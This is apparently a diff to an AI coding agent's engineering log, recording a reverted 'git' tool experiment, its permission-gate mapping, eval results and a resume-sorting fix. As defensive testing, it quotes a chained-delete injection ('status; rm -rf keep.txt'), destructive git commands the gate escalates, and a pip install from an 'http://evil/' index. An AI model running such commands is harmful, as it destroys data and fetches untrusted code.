@@ -5,6 +5,77 @@ One row per tuning cycle: hypothesis, change, before, after, kept or reverted.
 
 ---
 
+## FR-205: git as a tool - REVERTED (2026-09-25)
+
+**It was called 0 times in 161 calls.** The guard was clean and the tool earned
+nothing, so it is gone.
+
+**Hypothesis**: `run_shell` can already run git, so the point was the
+DESCRIPTION - prompt text the model reads at runtime, measured load-bearing here
+(`edit_file`'s wording took real repositories 0/9 -> 4/7).
+
+**Change**: one `@tool(risk="write")` named `git`, a single `args` string, run
+with **no shell** (`shlex.split` -> `["git", *parts]`), so quoting was not the
+model's problem and `;`/`&&` chained nothing. Two deviations from the plan, both
+deliberate: no separate `operation` parameter, because `@tool` derives no enum
+from a signature and `shell=False` removes the injection a whitelist would have
+guarded; and `run_shell`'s body was extracted into a shared `_capture(command,
+seconds, shell)` rather than duplicating 25 lines, which §13 forbids.
+
+**The gate half was the interesting part.** The three git rules in `DANGER` were
+written against a SHELL command and look for the literal word `git`, so a tool
+taking only the part after it is invisible to them. `EXECUTES` now maps a tool to
+`(argument, prefix)` - `{"git": ("args", "git ")}` - which is data in the
+declaration table, not a name special-case in `classify()`. With it,
+`git push --force`, `reset --hard` and `clean -fdx` all escalate through the new
+tool exactly as through a shell.
+
+**Bar, pre-registered, and it had to be restated first.** The plan said "dev
+15/15, tools 9/9, revert if neither moves" - which is arithmetic nonsense,
+because both splits are AT ceiling and cannot move up. The same mistake as Phase
+R's 11/11. Restated before measuring: (1) dev holds at 15/15, a fall reverts;
+(2) `git` is called at least once.
+
+**Result**: dev **14/14 scored, 1 blocked** at `MAX_TURNS=30`, zero tamper, zero
+write violations, 1.17M tokens. `off-by-one` run 1 reached the 30-turn cap,
+ended `stuck`, and passed anyway. The guard is clean. `git` was called **0 times
+in 161 calls**.
+
+**Why the zero is not a verdict on the tool, and why it reverts anyway.** No dev
+fixture is a git repository and no goal in any split mentions git, so
+`git status` would have returned `fatal: not a git repository`. The zero measures
+the FIXTURES' silence. But nothing measured shows the tool buying anything, and
+775 chars of schema is rent on every turn of every run on a provider that caches
+nothing - `search_files` is the precedent already paid for, a tool duplicating
+`run_shell`'s reach used 70 times in 8,820 calls. Keeping this on "it seems
+right" is what the discipline exists to stop.
+
+**The eval design was wrong and I should have caught it before writing the bar.**
+I checked the three `tools` goals for git and did not check whether any workspace
+was a repository. Measuring FR-205 needs a fixture that REQUIRES git - a repo
+whose bug was introduced in a known commit, findable from the history - because
+a task requirement binds where advice about a tool does not.
+
+**Two things measured on the way that OUTLIVE the revert:**
+
+- **The schema budget is far tighter than the plan assumed.** 6,349 is the
+  BUILT-INS only; the live toolset in a scored run, with memory and MCP, reads
+  **7,650 before this tool and 8,427 after**. Real headroom is **1,573 of
+  10,000**, not ~3,650. Cycle 5's browser server has to fit four tools into
+  that and probably cannot.
+- **`--continue` never resumed anything.** It sorted run directories by NAME and
+  took the last, so `control-20260922-e65d94b` beat every `2026...` timestamp
+  (`c` > `2`) and it resumed the real-repo control, then refused it for
+  describing a different run. One morning's resume produced 0 rows after 5
+  preflight probes. Now sorted by each manifest's own `started`, with the mtime
+  as fallback. KEPT - it is a rig fix, not an agent change, and it is what made
+  the rest of this measurement possible. 2 tests.
+
+1,232 tests while it existed; 1,224 after the revert, which is 1,222 plus the
+rig fix. Both halves were mutation-checked before the revert: drop the `git `
+prefix and `push --force` runs at `auto`; run it through a shell and
+`status; rm -rf keep.txt` deletes the file.
+
 ## FR-204: where a package comes from (2026-09-24)
 
 **Hypothesis**: `pip install --index-url http://evil/ x` was `auto`, so arbitrary
